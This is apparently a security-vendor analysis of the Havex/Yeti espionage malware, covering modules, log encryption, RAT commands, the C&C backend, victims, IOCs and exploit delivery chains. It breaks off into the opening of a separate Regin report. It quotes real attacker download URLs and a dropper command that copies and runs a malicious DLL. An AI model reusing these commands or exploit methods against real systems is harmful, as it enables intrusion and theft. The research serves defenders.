Versions 01A – 038 : Check proxy settings in the registry and use them if required .
Versions 01B – 044 : Use an asymmetric crypto algorithm ( RSA ) to decrypt the downloaded binaries .
Versions 020 – 025 : Check the Internet connection by trying to connect to google.com : CONNECT google.com:80 HTTP/1.0 Collect system information , write it to * .yls file .
Later , append these contents to the POST request string .
Version 025 : Contains a debugging symbols path , which may suggest that the project was internally called `` PhalangX '' : d : \Workspace\PhalangX 3D\Src\Build\Release\Phalanx-3d . ServerAgent.pdb Version 038 – 040 : Does not contain the routine that collects system info , yet the malware checks for potential previously created * .yls files , and appends the content of them to the POST request .
Instead of values hardcoded in the binary , this is a first version to use a resource to store encrypted config .
Detailed analysis of this version is included in this appendix .
Version 043 – 044 : Size similar to 037 and earlier versions ; dll name is now 0XX.dll ( where XX is version number ) , the < unk > value in config is now 29 bytes long .
Main characteristics : All currently known samples are completely identical in terms of code and differ only in the content of the resource .
This module looks for outlook.nk2 files , gets the contact data from inside them and writes it to the * .yls file .
Data is as always bzip2 compressed and 3DES encrypted .
Config is stored in the resource HYT 017D ( bzip2 compressed and encrypted with same xor key as always ) .
Config consists of an RSA key ID ( 29 bytes ) , base 64 bit encodedRSA key ( 1024 bit ) and nk2 file path ( 39 bytes ) .
This module collects the same type of information about the system as Havex versions 020 - 025 .
This functionality is not present in versions > = 026 - it was probably moved into this separate module around that time .
This module is used to decrypt and execute the binary that comes in the resource .
The EXE file is saved in % TEMP % \ < rand > .exe
Besides the binary , resource HAJ 3A0 contains hex string : 30 0A 30 0A 34 38 36 34 30 0A This PE EXE file was dropped and run by EXE dropper module ( 2120c3a30870921ab5e0314 6a1a1a865dd24a2b5e6f0138bf9f2ebf02d490850 ) .
Its main functionality is to scan the local network looking for machines listening on specified ports .
All information is logged into a % TEMP % \~tracedscn.yls file in plain text .
This module is used to decompress ( bzip2 ) and drop a password dumping tool from resource DLL1 A8 409 to % TEMP % \bp.exe and run it with the following command : % TEMP % \bp.exe % TEMP % \~tmp1237.txt '' Saved log is then copied to % TEMP % \ < rand > .tmp.yls
This file was dropped and executed by the PSW dropper module ( 71e05babc107f5e52f1a4c3ea6261 c472d2649c0b179395304c420eaa54e2062 ) .
This is a customized ( ? ) version of BrowserPasswordDecryptor 2.0 - a free password recovery tool , developed by SecurityXploded : Browser Password Decryptor is the FREE software to instantly recover website login passwords stored by popular web browsers .
Currently it can recover saved login passwords from following browsers : • Instantly decrypt and recover stored encrypted passwords from popular web browsers .
Each module is capable of creating a log file ( .yls
The encryption library used by the modules ( as well as the most recent versions of Havex ) is handled by the RSAeuro library .
They recompiled the library several times using different compiler settings and optimization ( depending of modules / Havex ) which makes fingerprinting the functions a bit tedious .
Once the log has been compressed using bzip2 , the modules use the library to generate a random 192 bit 3DES key ( 168 bit effective ) and a 64 bit Initialization Vector .
The function used to do so is R_GenerateBytes which is using the MD5 algorithm previously seeded by the R_RandomCreate function ( Also using MD5 ) : Once the key and the IV have been generated , the 3DES algorithm is initialized : Once 3DES is initialized , the next step is to RSA encrypt the 3DES KEY using the RSAPublicEncrypt function .
It is essentially creating the PKCS # 1 padding block around the key and then calling the rsapublicencrypt function .
Example of a layout where 0x42 is the PKCS # 1 padding block and 0x41 the 3DES key ( original values overwritten for clarification purpose ) : The rsapublicencrypt is basically a wrapper to various big num functions used to compute RSA : N parameter in one sample : The E parameter is the standard 0x10001 After the 3DES key is encrypted using RSA , the log files are encrypted .
The final encrypted log file layout looks like the following : ( important parameters overwritten for clarity ) : The YLS file format can be described as follows : • SIZE OF RSA Identifier : 0x29 in the figure above • RSA ID : `` 39ee448cf196304cfe9c6b1c2e436 '' .
Mandatory to decrypt logs .
They can identify which Public RSA Key was used from the identifier , and decrypt the 3DES key using their Private RSA Key .
From there , they can use the 3DES Key and the Initialization Vector which is present in clear form to decrypt the log file .
The ClientX backdoor binaries were found in an open directory on one of the C2 servers .
They consist of two .NET
One of them is called client.exe , which is the main malware component .
The second is library.dll , which provides functions to client.exe .
The client.exe file has built - in debug messages , but the binary was compiled as a GUI application .
By editing the PE header , it is possible to change it back to console , and see real time debug messages as the malware operates : Here is what is displayed upon execution : Upon execution , client.exe starts by sleeping for 10 seconds .
It then creates a Mutext called `` clientX '' to check whether other instances of the malware are already running .
If no other instance of the malware is found , it will write `` One instance '' and continue execution .
Otherwise , it will print out '' More than one instance '' and terminate .
Immediately after creating the Mutex the `` cleaner '' method is called .
This method looks for all executables in the current folder and deletes files with names that do not match some file property criteria .
This is used to delete older versions of the RAT after a successful update ( See the commands UPD later described in this appendix ) The backdoor then starts the main loop , which is an infinite while loop .
Some settings are checked by the backdoor .
After the debug message `` RegIeDir '' , the following registry key is opened `` HKEY_CURRENT_USER\\ SOFTWARE\\Microsoft\\Internet Explorer '' and the subkey `` InternetRegistry '' is checked .
If not found , a subkey is created .
That part is closed by a debug message : `` RegIeDir done '' .
The `` run - work '' debug message indicates that the malware is gathering two registry keys for later use .
There is a structure named `` prSettings '' with the following fields : The last two fields `` prSettings . KeyRun '' and `` prSettings . KeyWork '' are the one filled by `` run - work '' .
The `` CheckAccessLM '' and `` CheckAccessCU '' methods check for access to Local Machine and Current User , respectively .
If the LOCAL MACHINE is n't accessible the following error message is displayed `` LM error : error reason '' , otherwise `` LM no error '' .
If the CURRENT MACHINE is n't accessible the following error message is displayed `` CU error : error reason '' , otherwise `` CU no error '' .
If for some reason , neither `` SOFTWARE\\Microsoft\\Windows\\CurrentVersion '' from Local Machine nor Current User is accessible , the following '' HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Internet Explorer\\InternetRegistry '' will be used for `` KeyWork '' .
Once the registry keys are identified , the debug message `` run - work done '' is displayed .
The malware prints both KeyRun and Keywork and continues execution .
A subkey is added to KeyRun to automatically start the malware when Windows reboots .
The name of that subkey comes from the `` version information '' entry of the resource section where the internal and original file name can be found .
The full path of the malware is set and the malware can now survive reboot .
The debug message '' work '' is displayed .
The next step focuses on the Keywork registry key .
The following subkeys are checked and created if not present in Keywork\\ [ name_from_version _ information ] : `` done '' , `` doneEXT '' , `` work '' , `` settings '' and `` servers '' .
They hold not any value at this point .
This part is ended by a debug message : `` run - work done 2 '' Immediately after checking for special subkeys , the IDget method is called .
If the `` i d '' subkey does n't exist , the method IDset is called and a new BOTID is created and stored as a Base64 encoded string .
Afterwards , the IDget method is called and the BOTID is Base64 decoded from the registry and saved for later use in prSettings.id .
It does the same for `` prSettings.priv '' , `` prSettings.pub '' , `` prSettings.timeout '' and `` prSettings .
The developers made a mistake .
The `` prSettings.priv '' is set using the IDget method instead of the KeyPrivGet method .
However , this makes little difference since KeyPubGet , KeyPrivGet and IDget are wrappers to the GenerateID methods .
This could have introduced a serious flaw if those parameters were used in a secure scheme : Once it is done filling the prSettings structure , the debug message `` settingcheck done '' is displayed .
The next method called by our trojan is `` AnsSend '' .
It stands for `` Answer Send '' .
It starts with the debug message `` ANSWER '' .
This part of the code looks into the registry , specifically into the `` KeyWork\\ [ name_from_version _ information ] \\done '' and doneEXT subkeys to see if there is anything ready to be posted to the C & C server .
Those subkeys should be empty at this stage , since the Answers are only created after a task received from the C & C server is completed .
Should answers be available , their numbers would be printed as a debug message and processed and the following would be displayed as a debug message : This essentially does a POST request to the C & C server using the BOTID and the following User Agent : `` Mozilla/5.0 ( Windows NT 6.1 ; rv:5.0 ) Gecko/20100101 Firefox/5.0 '' On the C & C server side , a new file would be created named after the BOTID with the extension '' .ans
Here is an example of such a file : The date of the post can be found , the base64 encoded C & C server and the unicode string Answer , modified in this example .
This is how the attackers get an answer ( result ) from a given task .
The WorkReceive function essentially does a GET request on the C & C server in order to receive a task to complete on the infected computer .
The task to execute is encrypted and base64 encoded and returned between the `` havex '' tags .
Here is an example without any task between the tags : The trojan calls the DataParser to locate the task : The task is decrypted , decoded and stored in the `` KeyWork\\ [ name_from_version_information ] \\ work '' subkey .
Just before the WorkBegin method is called , the `` begin work '' debug message is displayed .
The first thing WorkBegin does is decrypt and unbase64 the answer returned from the DataParser .
Afterwards , two things are extracted : The command to execute and the data parameter for the command .
The final step calls the command dispatcher , which executes the command sent by the attackers .
The `` SCR '' command is used by the attacker to request a Screen Capture of the infected computer .
Typical GDI functions are used , including : CreateCompatibleDC , GetSystemMetrics and CreateCompatibleBitmap .
The screenshots are made as JPG files .
If a screenshot already exist , it is deleted prior the creation of a new one .
The `` DIR '' and `` DIS '' commands are used to generate Directory listings using the XML format .
The TIM command is responsible for updating the Timeout parameter in the registry .
The command finds where the KeyWork is located and updates the Time out with the parameter provided to the command .
The UPD command is used to run an updated version of the RAT .
The currently running RAT executes the update and exits .
Upon execution , the newly updated version will delete the old RAT using the Cleaner method described earlier .
Change Folder attributes .
The LIB command is used to load a DLL on the infected machine .
It simply uses LoadLibrary .
The FIR command is used to run an executable on the infected computer .
The process is created with hidden windows to stay unnoticed .
The UPS command is used to update the C & C server in the registry .
The FIS command is used to check if the file passed as parameter exists on the infected computer .
The FIT command is used to delete a file passed as parameter to the command if it exists on the infected computer .
The CMD command is used to execute a command on the infected machine using cmd.exe The KEY command is used to update the Priv and Pub key in the registry .
Once the commands have been executed , the debug message `` End work '' is displayed .
The malware then sleeps for a random amount of time and the main loop continues .
If the commands were executed , all results stored in the registry will be POSTED to the server via the AnsSend method .
The malware loops forever waiting for new orders from the attackers .
The Delphi packer contains anti- debugging tricks and code especially crafted to overrun sandbox mechanisms .
The packer unpacks and executes the main binary in several stages , creating multiple separated processes and threads .
Code flow : This EXE copies the additional MZ from its overlay to C : \ProgramData\Cap\Cap.exe and runs this file using following command : Then it deletes the directory C : \ProgramData\Cap and all the files in it , deletes itself and exits .
It uses encrypted strings - XOR with progressively incremented value .
Text output produced by application is redirected to the C : \ProgramData\Mail\MailAg\scs.txt file and contains information such as : Description of the DuckLink CmdCapture functionalities from the README file that comes with the application : This freeware program designed to capture images of the screen .
Main Features : * Full Screen Capture ( display selection support ) .
Example of part of the content of the scs.txt file : @ HOUR : Hours value of clock in 24-hour format .
Range is 00 to 23 Sample Value : 23 @ MDAY : Current day of month .
Range is 01 to 31 Sample Value : 22 @ MIN : Minutes value of clock .
Range is 00 to 59 Sample Value : 19 @ MON : Current month .
Range is 01 to 12 Sample Value : 07 @ MSEC : Milliseconds value of clock .
Range is 00 to 999 Sample Value : 050 @ SEC : Seconds value of clock .
Range is 00 to 59 Sample Value : 52 @ WDAY : Numeric day of week .
Range is 1 to 7 which corresponds to Sunday through Saturday .
Sample Value : 3 @ YDAY : Current day of year .
Range is 001 to 366 ( or 001 to 365 if not a leap year ) Sample Value : 203 @ YEAR : Current four - digit year Sample Value : 2014 @ ComputerName : Computer 's network name .
Sample Value : WINXP @ ComSpec : value of % comspec % , the SPECified secondary COMmand interpreter ; primarily for command line uses , e.g .
Run ( @ ComSpec & `` /k help | more '' ) Sample Value : C : \WINDOWS\system32\cmd.exe @ CPUArch : Returns `` X86 '' when the CPU is a 32-bit CPU and `` X64 '' when the CPU is 64-bit .
Sample Value : X64 @ HomeShare : Server and share name containing current user 's home directory .
Sample Value : @ IPAddress1 : IP address of first network adapter .
Tends to return 127.0.0.1 on some computers .
Sample Value : 192.168.56.11 @ IPAddress2 : IP address of second network adapter .
Returns 0.0.0.0 if not applicable .
Sample Value : 0.0.0.0 @ IPAddress3 : IP address of third network adapter .
Returns 0.0.0.0 if not applicable .
Sample Value : 0.0.0.0 @ IPAddress4 : IP address of fourth network adapter .
Returns 0.0.0.0 if not applicable .
Sample Value : 0.0.0.0 @ LogonDNSDomain : Logon DNS Domain .
Sample Value : @ LogonDomain : Logon Domain .
Sample Value : WINXP -- - snip -- - File listing module SHA-256 : 07bd08b07de611b2940e886f453872aa8d9b01f9d3c61d872d6cfe8cde3b50d4 Size : 15872 Timestamp : Tue , 02 Jul 2013 12:41:47 UTC Source : 91.203.6.71/check2/muees27jxt/fl.exe Detected as : HEUR : Trojan . Win32.Generic Module listing file .
Saves a list of documents that have specified extensions or contain specified strings in the file name to the C : \ ProgramData\Mail\MailAg\fls.txt file .
Saved information includes path , size and modification time .
The C & C Backend is written in PHP , consisting of 3 files .
Please see `` source.php '' below for further information .
Following the functions on execution : 1 .
Collects the following Information : 2 .
Writes the above information to `` testlog.php '' , separated by `` Tabulator '' and base64-encoded , with the following syntax : < timestamp > \t < victim ip - address > \t < proxy > \t < botID > \t < request - uri > \t < useragent > 3 .
Writes all transferred HTTP - GET Variables to `` < botID > .log
If the bot executed an HTTP - POST - request , the transferred data is written to the file `` < botID > .
Checks for any file `` < botID > _ * .txt '' a .
If found the timestamp , filename and Status `` sent '' are first appended to `` < botID > .log
Then the file content is transferred to the bot , embedded into HTML with HTML - Body `` No data ! '' and HTML - Comment `` Havex '' containing the data to be transferred .
Finally the file on the server will be removed .
If removal fails it 's logged to `` < botID > .log
If no matching file is found , a HTML - Response is sent with an empty `` Havex '' HTML- Comment and HTML - Body text `` Sorry , no data corresponding to your request .
A total of 101 victims have been identified .
Victim 1 Offers a complete range of manufacturing processes including precision injection molding , cleanroom molding and assembly , sheet metal fabrication , supply chain management and distribution .
Victim 2 Ukrainian wholesale suppliers for the pharmaceutical market .
Victim 3 General contracting , design build and construction management company ; based in Alabama .
Victim 4 Company performing web developing , hosting , consulting and content management .
Victim 5 University in Ukraine .
Victim 6 Develops larger machines for international manufacturers – Ireland .
Victim 7 School in Tennessee .
Victim 8 Special Purpose Machines .
Working in several sectors including the pharmaceutical , automotive , printing or plastic industry .
Victim 9 Corporation - Area of activity : Adult Internal Medicine , Infectious Disease , Pediatrics , OB / GYN , Dentistry , Psychology , Psychiatry , Social Services Victim 10 Faculty of Electrical Engineering , Mechanical Engineering and Naval Architecture .
Victim 11 Distributor for construction machinery , energy systems and Caterpillar brand equipment .
Victim 12 One of Northern Ireland 's most respected and innovative construction companies .
Victim 13 Supplier of IT services and products .
Victim 14 Multi - trade company providing high quality electrical , HVAC , IT , across the country ( US ) .
Victim 15 Area of activity : Packaging systems .
Victim 16 Web development and hosting including ERP and commercial implementation and consulting services .
Victim 19 Integrated online marketing agency .
Russia .
Victim 20 Design and manufacture of standard and custom leak test machines .
Victim 21 University in Spain .
Victim 22 Towing / hauling solutions to the commercial trucking industry .
Located coast to coast in the U.S. , Canada , Europe , Australia and Mexico .
Victim 23 University in Poland .
Victim 24 Areas of activity : recycling , mining and food sorting .
Victim 25 Systems integrator located in North Carolina .
Specializes in the design and implementation of SCADA systems .
Victim 26 City council - Poland .
Victim 27 University in China .
Victim 28 Cleaning solutions .
Victim 29 Manufacturer of flexible packaging and advanced laminate design solutions .
Victim 30 Custom manufacturing of complex three - dimensional sheet metal parts .
Victim 31 Specializes in mechanical engineering .
Area of activity : Laminating - Machines , Used - Machinery .
Victim 32 Structural engineering field in every major market sector and construction type .
California .
Victim 33 Courier services worldwide .
Greece .
Victim 34 Institute of Physics .
Croatia Victim 35 Supplies public sector organizations with products and contracts .
Victim 36 University in Spain .
Victim 37 University in Poland .
Victim 38 University in Poland .
Victim 39 Research & Education Network .
Victim 40 University in Germany .
Victim 41 American multinational technology and consulting corporation .
Victim 42 Creates and manages international private WANs for large multinational companies .
Victim 43 Informatics Centre in India .
Victim 42 Health authority in Canada .
Victim 43 County Government in USA .
Victim 44 University in USA .
Victim 45 American multinational conglomerate corporation .
Victim 46 Unit within University in USA .
Victim 47 Operates high speed computer network in Turkey .
Victim 48 University in Poland .
Victim 49 Telecommunications and computing services .
Victim 50 American multinational document management corporation .
Victim 51 Major electronic systems company based in France acting in areas such as defense , aerospace , airline security and safety , information technology , and transportation Victim 52 Swiss multinational pharmaceutical company .
Victim 53 American manufacturing conglomerate involved in aircraft , the space industry , defense - oriented and commercial electronics , automotive and truck components .
Victim 54 Industrial suburb in India .
Victim 55 Information Technology company .
Iran .
Victim 56 University in China .
Victim 57 Global payments and technology company .
Victim 58 College in USA .
Victim 59 University in Germany .
Victim 60 University in UK .
Victim 61 Supercomputing and Networking Center .
Poland .
Victim 62 University in Canada .
Victim 63 University in USA .
Victim 64 University in Spain .
Victim 65 Academic and Research Network .
Ukraine .
Victim 66 University in Canada .
Victim 67 Front , middle , and back office services for global financial markets .
Victim 68 Greek Public Administration Network Victim 69 University in the USA .
Victim 70 University in Russia .
Victim 71 Airport Authority in the USA .
Victim 72 Multinational manufacturer .
Germany .
Victim 73 Energy consumption analysis company .
Victim 74 University in the USA .
Victim 75 University in Taiwan .
Victim 76 University in Japan .
Victim 77 University in Taiwan .
Victim 78 University in the USA .
Victim 79 University in the USA .
Victim 80 University in Sweden .
Victim 81 University in Poland .
Victim 82 Pharma industry .
Victim 83 Digital content for education and research in the UK .
Victim 84 University – weather research .
Victim 85 University in South Korea .
Victim 86 Construction management services .
Victim 87 Education and Research Network , China .
Victim 88 Communications network for science and research , Germany .
Victim 89 University in the USA .
Victim 90 University in Spain .
Victim 91 University in South Korea .
Victim 92 Academic and Research Network , Croatia .
Victim 93 Encryption technology Institute .
Victim 94 University in the USA .
Victim 95 Chemical company , Germany .
Victim 96 School , USA .
Victim 97 University in Ukraine .
Victim 98 Liquefied natural gas , US energy demand .
Victim 99 University in Poland .
Victim 100 Academic and Research Network , Australia .
Victim 101 Space research institute , Russia .
Path : % TEMP % \mbCHECK.exe SHA-256 : 34254c2decc973dbd8f28b47690f233f5c5d3e1735ee20a6b8dd1dbe80d16d81 Size : 1647104 Compiled : Thu , 25 Jul 2013 13:30:28 UTC Description : original software , version 1.1.1.0 Path : % TEMP % \qln.dbx Size : 2 Description : text file with Havex version number Registry modification : [ HKCU|HKLM ] \Software\Microsoft\Windows\CurrentVersion\Run ] svcprocess = rundll32 `` % SYSTEM % \svcprocess043.dll '' , RunDllEntry [ HKLM\Software\Microsoft\Internet Explorer\InternetRegistry ] fertger = 229182459113651166490098FD80-c8a7af419640516616c342b13efab Second stage tool delivery : kinoporno.org was a confirmed Yeti site .
It served Havex variant ( d532eb6835126e53e7ae491ae29f d8b3 ) at kinoporno.org/Provider.dll .
It also served up the well - known lateral movement utility 64bit Windows Credential Editor tool at kinoporno.org/wce64.exe Another example above included a credential and document stealing component , downloaded as a part of the attack chain from nahoonservices.com : 91.203.6.71/check2/muees27jxt/fl.exe CVE-2011 - 0611 - PDF exploit The exploit is delivered as an XDP file ( XML Data Package ) which is actually a PDF file packaged within an XML container .
This is a known PDF obfuscation method which serves as an additional anti - detection layer .
The XDP file contains an SWF exploit and two files ( encrypted with XOR 0x04 ) stored in the invalid section of the PDF .
One of the files is Havex DLL ( version 038 ) , the other is a small JAR file , which is used to copy and run the DLL by executing the following command : cmd /c copy < fname_passed_as_param > % TEMP % \\explore.dll /y & rundll32.exe % TEMP % \\ explore.dll , RunDllEntry The SWF executes the action script , which contains a shellcode ( encrypted with XOR 0x96 ) and another SWF file ( encrypted with XOR 0x7D ) which uses the CVE-2011 - 0611 vulnerability to run the shellcode .
The shellcode then looks for the signature S18 t in the memory ( which signs the start of encrypted DLL ) , decrypts and loads it .
Files summary : In relation to the Yeti infections , we have discovered a malicious JAVA applet - named googlea .
It uses either CVE-2012 - 1723 or CVE-2012 - 4681 , depending on which Java version is running on the victim 's machine .
It downloads payloads to % JAVATMP % \roperXdun.exe ( where X is the sequential number starting from 0 for the payload from the first URL from the list ) and executes them .
The URL list is stored in the `` uid '' parameter in HTML file , so there is no way of checking what the payload was and where it came from without having the original HTML that embedded the malicious applet .
The URLs in the parameter are encrypted in the form of a string composed from numbers from 0 to 71 separated by colons .
Each number represents a different ASCII character .
Almost predictably , this early Yeti pdf exploit is yet another metasploit rip .
The ROP used in this Yeti exploit matches the msf code instruction for instruction .
The pdf stores the Havex downloader in its content , which it writes to % temp % and executes after obtaining control flow from Adobe Reader .
The significant stages of this exploit start by setting up parameters for the vulnerable strcat call in the CoolType SING table parsing library here , in order to overwrite the stack with an appropriate ROP blob .
The code is paused here at the vulnerable strcat call : After the strcat call values smash the stack , an exact copy of the metasploit ROP code delivered by the Yeti exploit pivots from the ( msf - selected ) icucnv36.dll library into the microsoft c runtime to make a memcpy call here : The original 0-day exploiting this Adobe Reader vulnerability targeted icucnv34.dll .
Function call chains for both the Yeti ROP and the msf ROP are as follows : CreateFileA CreateFileMappingA MapViewOfFile save and load the saved mapping ptr memcpy ret back into shellcode for Havex file write to % temp % and execute This work is clearly a rip from metasploit .
This exploit was first seen on a large scale when exploit code targeting cve-2012 - 5076 was included in the `` Cool Exploit '' pack .
The flaw lies in the configuration of the JRE itself and enables untrusted applets to access dangerous packages .
In other words , `` com.sun.org.glassfish . , \ '' was left out of the checkPackageAccess list in the java.security file .
From the unrestricted com.sun.org.glassfish .
In this case , one of the exposed `` dangerous '' packages happens to be com.sun .
The new instance of localClass created from smd_bytes is nothing more than a call to set the SecurityManager value to null , effectively turning off the JRE sandbox security access features .
The exploit maintains a class in the byte array : And when decoded , the contents of this smd_bytes array are in fact `` SecurityManagerDisabler .
It downloads www.nahoonservices.com/wp-content/plugins/rss-poster/jungle.php to % temp % , renames it to TMPprovider0.dll and executes the Havex code : This exploit is ripped almost directly from the metasploit framework - it 's simply modified with an additional string obfuscation handling method .
The obfuscation code in this java exploit is fairly weak but effective in modifying the metasploit code just enough to cover up similarities .
The exploit code was only slightly modified here to demonstrate the crypto routine and hardcoded string values for the payload url and filepath : Output here : The exploit itself is finicky .
It is another rip of the corresponding metasploit code , with minor modifications .
See `` Obvious Metasploit Rips '' below .
The shellcode delivered with the exploit is nothing out of the ordinary , using expected thread environment variables to identify module locations in the memory ...
The shellcode gets more interesting due to the manner in which the download url string was built .
The encoding algo was a simple additive 0x1010101 against every four bytes of the reversed string '' kenzhebek.com/tiki/files/templates/listpages/hoem.php '' , which was downloaded as a Havex backdoor .
The decoder looks like this ...
Identifying the clsid used in this script is a giveaway on the targeted MS XML Core Services software : Of course , most of this code appears to be ripped from the corresponding metasploit exploit code .
Interestingly , the metasploit code was derived from 0day Itw at the time in June 2013 .
But the attackers did n't use it until after the vulnerability was patched .
The Yeti attackers simply did not need a 0-day arsenal .
The attackers must have known or expected that they were targeting Internet Explorer 7 on the victims ' systems .
The later , updated versions of the corresponding metasploit code maintain ROP to evade problems with attacking IE 8 + ASLR / DEP protections , but the Yeti code does not .
This absence is somewhat odd , because KSN events indicate the code was active in August 2013 , and the metasploit dev added ROP to their code in June 2013 .
The shellcode delivered from this exploit also includes an unusual url and filename string build routine : The decoded strings here : The Yeti exploits are ripped line - for - line from the metasploit framework .
For example , class files served from www.nahoonservices.com/wp-content/plugins/rss-poster/start .
From the Yeti LyvAGalW.class file : And for comparison , here is the java exploit code from metasploit framework : github.com/rapid7/ metasploit - framework / blob / master / external / source / exploits / cve-2013 - 1488/Exploit.java : Yeti 's delivery of CVE-2013 - 1347 from nahoonservices.com/wp-content/plugins/rss-poster/negc .
From negc.html The matching CVE-2013 - 1347 code pulled from msf https : //github.com / rapid7/metasploit - framework / blob / master / modules / exploits / windows/ browser / ie_cgenericelement_uaf.rb ( minor modifications made to its shellcode build algorithm .
Actually , the Yeti version is dumbed down , when compared to the metasploit framework version ) : In earlier cases ( July 2013 ) , successful Java exploitation served from nahoonservices.com would cascade into more Yeti components planted on victim systems .
The java exploit in turn downloaded Karagany backdoors , which in turn downloaded stealers from 91.203.6.71 : User visits utilico.co.uk → redirected to → nahoonservices.com → Java Exploits → www.nahoonservices.com/wp-content/plugins/rss-poster/start.jar www.nahoonservices.com/wp-content/plugins/rss-poster/juch.php a615d71af0c856c89bb8ebb5c6e7644d fcf7bfe68ff302869475b73e4c605a099ed2e1074e79c7b3acb2a451cd2ea915 juch.php saved as `` searchindexer.exe '' , or `` coresyns.exe '' and run , then downloads and runs ...
This string appears to be more commonly implemented at the active exploit sites : hxxp : //keeleux.com / sfreg / img / nav / iden21php ? dwl = fne It writes out the TmpProvider.dll Havex loader downloaded from this resource and runs it using '' rundll32.exe '' .
Internet Explorer CVE-2013 - 1347 http : //www.cve.mitre.org / cgi - bin / cvename.cgi ? name = CVE-2013 - 1347 '' Microsoft Internet Explorer 8 does not properly handle objects in memory , which allows remote attackers to execute arbitrary code by accessing an object that ( 1 ) was not properly allocated or ( 2 ) is deleted , as exploited in the wild in May 2013 .
Oracle has not commented on claims from another vendor that this issue allows remote attackers to bypass the Java sandbox via vectors related to `` Incorrect image channel verification '' in 2D .
Oracle has not commented on claims from the original researcher that this vulnerability allows remote attackers to bypass permission checks by the MethodHandles method and modify arbitrary public final fields using reflection and type confusion , as demonstrated using integer and double fields to disable the security manager .
If there is still a vulnerable condition , then a separate CVE identifier might be created for the unfixed issue .
Mozilla Firefox CVE-2013 - 1690 https : //cve.mitre.org / cgi - bin / cvename.cgi ? name = cve-2013 - 1690 '' Mozilla Firefox before 22.0 , Firefox ESR 17.x before 17.0.7 , Thunderbird before 17.0.7 , and Thunderbird ESR 17.x before 17.0.7 do not properly handle onreadystatechange events in conjunction with page reloading , which allows remote attackers to cause a denial of service ( application crash ) or possibly execute arbitrary code via a crafted web site that triggers an attempt to execute data at an unmapped memory location .
In the spring of 2012 , following a Kaspersky Lab presentation on the unusual facts surrounding the Duqu malware ( http : //www.kaspersky.com / about / press / major_malware_outbreaks / duqu ) , a security researcher contacted us and mentioned that Duqu reminded him of another high - end malware incident .
Although he could n't share a sample , the researcher mentioned ' Regin ' , a type of malware attack that is now dreaded by security administrators in many government agencies around the world .
For the past three years we have been tracking this most elusive malware all around the world .
From time to time samples would appear on various multi - scanner services , but they were all unrelated to each other , cryptic in functionality , and lacking in context .
It is unknown exactly when the first samples of Regin appeared in the wild .
Some of them have timestamps dating back to 2003 .
The victims of Regin fall into the following categories : • Telecom operators • Government institutions • Multinational political bodies • Financial institutions • Research institutions • Individuals involved in advanced mathematical / cryptographic research So far , we ' ve observed two main objectives of the attackers : • Intelligence gathering • Facilitating other types of attacks While in most cases the attackers were focused on extracting sensitive information such as emails and other elec- tronic documents , we have observed cases where the attackers compromised telecom operators to enable the launch of additional sophisticated attacks .
This is discussed in detail in the GSM attacks section , below .
Perhaps one of the most well - known victims of Regin was Jean Jacques Quisquater ( https : //en.wikipedia.org/ wiki / Jean - Jacques_Quisquater ) , a well - known Belgian cryptographer .
In February 2014 , Quisquater announced he was the victim of a sophisticated cyber - intrusion incident .
We were able to obtain samples from the Quisquater case and confirm they belong to the Regin platform .
Another victim of Regin was a computer we call the ' Magnet of Threats ' .
The computer belongs to a certain research institution and , besides Regin , it has been attacked by Animal Farm , Itaduke , Mask / Careto , Turla , and some other advanced threats that do not have public names , all co - existing happily on the same computer at some point .
The exact method used for the initial compromise remains a mystery , although several theories exist , including use of man - in - the - middle attacks with browser zero - day exploits .
For some of the victims we observed tools and modules designed for lateral movement .
So far we have not encountered any exploits .
The replication modules are copied to remote computers using Windows administrative shares and then executed .
Obviously this tech- nique requires administrative privileges inside the victim 's network .
In several cases the infected machines were also Windows domain controllers .
Targeting of system administrators via web - based exploits is a simple way of achieving immediate administrative access to the entire network .
Although some private research groups refer to it as the ' Regin malware ' , it is not entirely accurate to use the term malware in this case .
In essence , Regin is a cyberattack platform , which the attackers deploy in victim networks for total remote control at all levels .
The platform is extremely modular in nature and has multiple stages .
In general , the first samples victims detect in their networks are stage 1 loaders .
These are the easiest to notice because they are the only executables that exist directly on the victim 's computer .
These samples use an odd technique to load the next stages , which until recently was unique to Regin .
Inter- estingly , in mid-2012 , the ZeroAccess gang implemented a very similar loading mechanism , which possibly suggests it learned about Regin and its unique features .
The particular feature used ( or abused ) by Regin to hide its next stages is called NTFS Extended Attributes ( EA ) .
Originally , these were implemented in Windows NT for compatibility with OS/2 applications ; however , they made their way into later versions of Windows , namely 2000 , XP and Vista .
The malware hides its modules in NTFS EAs , splitting large files into several blocks of limited size .
These are dynamically joined , decrypted and executed in memory .
Most of the stage 1 samples we have seen appear to have been built on top of other source code projects , which are ' piggybacked ' ; for instance , the Ser8UART project : http : //www.mirrorservice.org / sites / downloads.sourceforge.net / s / se / ser8uart - driver / ser8uart - driver/ Ser8UART % 20 % 201.1.2.1/ .
For instance , the Regin loader with md5 01c2f321b6bfdb9473c079b0797567ba was built on top of the Ser8UART source code .
A careful examination however spots the encrypted configuration block at offset 0x5600 .
We can assume the attackers take various low - level open - source projects or Windows DDK source codes and merge them together with their malicious loader .
Hence , each stage 1 loader looks very different from others , as it contains random useless code from various other programs .
This technique makes it more difficult to build reliable detection for the loaders .
Despite the differences , all stage 1 samples are similar in functionality .
They contain an encrypted config block that points to the next stages : Once decrypted , the block contains several folder names and registry key names : In the example above , the stage 1 tries to load a second stage from the extended attributes of the system direc- tory specified in the configuration block ( in our case , the WINDOWS folder ) .
It also tries to read additional data from the EAs of the second directory ( in our case , the WINDOWS\fonts directory ) .
The second attribute value is optional and may have been used to overcome size limitations .
If the first EA data block is missing , the module also tries to read the complete body of the 2nd stage from a registry value using the key and value names from the configuration block .
The body of the second stage is encrypted with one of two algorithms that are simple variations of XOR , and is supposed to be a PE file .
The first stage loads that file in memory and calls its entry point function .
The 64-bit variant works in a slightly different way .
Instead of storing the 2nd stage in the registry or extended attributes , the attackers preferred to store it after the end of the last partition on disk .
Known filenames for the 64-bit stage 1 : • system32\wsharp.dll – detected on a victim machine in Germany • system32\wshnetc.dll – detected on a victim machine in Belgium All the stage 1 modules for 64-bit systems were signed with fake digital certificates .
The two fake certificates we identified are supposed to belong to Microsoft Corporation and Broadcom Corporation .
During the infection phase , the attackers inject a trusted CA in the certificates chain , which instructs the system to trust their signatures .
Here is what the hard drive of a 64-bit system infected with Regin looks like : Interestingly , while the 32-bit Regin stage 1 runs in kernel mode , on 64-bit systems the attacker code starts in user mode .
This is perhaps due to the fact that it is more difficult to run kernel mode on modern Windows 64-bit systems .
The second stage for 32-bit systems is implemented as a driver module .
It has a configuration block encrypted in a similar way to the first stage module .
